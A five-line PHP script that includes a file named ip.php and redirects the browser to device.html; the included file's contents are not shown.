<?php
include 'ip.php';
header('Location: device.html');
exit
?>
